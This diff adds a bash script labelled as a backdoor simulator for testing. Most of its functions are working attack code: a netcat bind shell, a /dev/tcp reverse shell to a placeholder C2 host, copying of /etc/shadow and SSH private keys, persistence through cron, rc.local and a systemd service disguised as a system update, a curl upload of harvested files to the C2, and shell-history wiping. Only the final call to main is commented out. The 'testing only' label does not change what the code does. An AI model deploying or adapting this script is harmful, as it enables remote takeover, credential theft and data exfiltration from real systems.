@@ -1,0 +1,207 @@
+#!/bin/bash
+# Backdoor Script Simulator - FOR TESTING PURPOSES ONLY
+
+# Configuration
+BACKDOOR_PORT=4444
+C2_SERVER="malicious-c2.com"
+LOG_FILE="/var/log/backdoor.log"
+PID_FILE="/var/run/backdoor.pid"
+
+# Malicious functions
+backdoor_listener() {
+    echo "Starting backdoor listener on port $BACKDOOR_PORT" >> $LOG_FILE
+    
+    # Create named pipe for communication
+    mkfifo /tmp/backdoor_pipe 2>/dev/null
+    
+    # Start netcat listener
+    while true; do
+        nc -l -p $BACKDOOR_PORT -e /bin/bash >> $LOG_FILE 2>&1 &
+        echo $! > $PID_FILE
+        sleep 10
+    done
+}
+
+establish_c2_connection() {
+    echo "Establishing C2 connection to $C2_SERVER" >> $LOG_FILE
+    
+    # Create reverse shell
+    while true; do
+        bash -i >& /dev/tcp/$C2_SERVER/8080 0>&1 2>>$LOG_FILE
+        sleep 30
+    done &
+}
+
+steal_credentials() {
+    echo "Attempting credential theft" >> $LOG_FILE
+    
+    # Try to access password files
+    if [ -f /etc/passwd ]; then
+        cp /etc/passwd /tmp/passwd_backup
+        echo "Password file copied" >> $LOG_FILE
+    fi
+    
+    if [ -f /etc/shadow ]; then
+        cp /etc/shadow /tmp/shadow_backup
+        echo "Shadow file copied" >> $LOG_FILE
+    fi
+    
+    # Look for SSH keys
+    find /home -name "id_rsa*" -o -name "id_dsa*" 2>/dev/null | while read key; do
+        cp "$key" /tmp/ssh_keys/
+        echo "SSH key stolen: $key" >> $LOG_FILE
+    done
+}
+
+install_persistence() {
+    echo "Installing persistence mechanisms" >> $LOG_FILE
+    
+    # Add to crontab
+    (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash /tmp/backdoor.sh") | crontab -
+    
+    # Add to startup scripts
+    echo "/bin/bash /tmp/backdoor.sh &" >> /etc/rc.local
+    
+    # Create systemd service
+    cat > /etc/systemd/system/backdoor.service << EOF
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash /tmp/backdoor.sh
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    
+    systemctl enable backdoor.service
+    systemctl start backdoor.service
+}
+
+network_reconnaissance() {
+    echo "Performing network reconnaissance" >> $LOG_FILE
+    
+    # Scan local network
+    nmap -sn 192.168.1.0/24 >> $LOG_FILE 2>&1
+    
+    # Check open ports
+    netstat -tuln >> $LOG_FILE
+    
+    # Check running processes
+    ps aux >> $LOG_FILE
+    
+    # Check network connections
+    ss -tuln >> $LOG_FILE
+}
+
+data_exfiltration() {
+    echo "Starting data exfiltration" >> $LOG_FILE
+    
+    # Create exfiltration directory
+    mkdir -p /tmp/exfiltrated_data
+    
+    # Collect system information
+    uname -a > /tmp/exfiltrated_data/system_info.txt
+    whoami >> /tmp/exfiltrated_data/system_info.txt
+    id >> /tmp/exfiltrated_data/system_info.txt
+    
+    # Collect network information
+    ifconfig > /tmp/exfiltrated_data/network_info.txt
+    route -n >> /tmp/exfiltrated_data/network_info.txt
+    
+    # Look for sensitive files
+    find /home -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null | head -100 | while read file; do
+        cp "$file" /tmp/exfiltrated_data/
+    done
+    
+    # Compress and upload
+    tar -czf /tmp/data.tar.gz /tmp/exfiltrated_data/
+    
+    # Upload to C2 server (simulated)
+    curl -X POST -F "file=@/tmp/data.tar.gz" http://$C2_SERVER/upload 2>>$LOG_FILE
+}
+
+privilege_escalation() {
+    echo "Attempting privilege escalation" >> $LOG_FILE
+    
+    # Check for SUID binaries
+    find / -perm -4000 2>/dev/null >> $LOG_FILE
+    
+    # Check for writable directories
+    find / -writable -type d 2>/dev/null | head -20 >> $LOG_FILE
+    
+    # Check for sudo access
+    sudo -l >> $LOG_FILE 2>&1
+    
+    # Try common privilege escalation techniques
+    # (This is just simulation - real exploits would be more sophisticated)
+    echo "Checking for kernel vulnerabilities..." >> $LOG_FILE
+    uname -r >> $LOG_FILE
+}
+
+hide_activity() {
+    echo "Hiding malicious activity" >> $LOG_FILE
+    
+    # Clear command history
+    history -c
+    rm -f ~/.bash_history
+    
+    # Hide processes
+    # (In real malware, this would use rootkit techniques)
+    echo "Process hiding techniques activated" >> $LOG_FILE
+    
+    # Modify log files
+    # (This is just simulation)
+    echo "Log modification techniques activated" >> $LOG_FILE
+}
+
+cleanup_traces() {
+    echo "Cleaning up traces" >> $LOG_FILE
+    
+    # Remove temporary files
+    rm -f /tmp/backdoor_pipe
+    rm -f /tmp/data.tar.gz
+    rm -rf /tmp/exfiltrated_data/
+    
+    # Clear temporary directories
+    find /tmp -name "backdoor*" -delete 2>/dev/null
+    
+    # Clear logs (simulation)
+    echo "Log clearing techniques activated" >> $LOG_FILE
+}
+
+# Main execution
+main() {
+    echo "Backdoor script starting..." >> $LOG_FILE
+    echo "PID: $$" >> $LOG_FILE
+    echo "Timestamp: $(date)" >> $LOG_FILE
+    
+    # Execute malicious functions
+    steal_credentials
+    network_reconnaissance
+    data_exfiltration
+    privilege_escalation
+    install_persistence
+    establish_c2_connection
+    backdoor_listener &
+    
+    # Hide activity
+    hide_activity
+    
+    # Keep running
+    while true; do
+        sleep 60
+        cleanup_traces
+    done
+}
+
+# WARNING: This is a simulation for testing purposes only
+echo "WARNING: This is a backdoor simulation for testing purposes only!"
+echo "DO NOT run this on production systems!"
+
+# Uncomment the line below to run the simulation
+# main
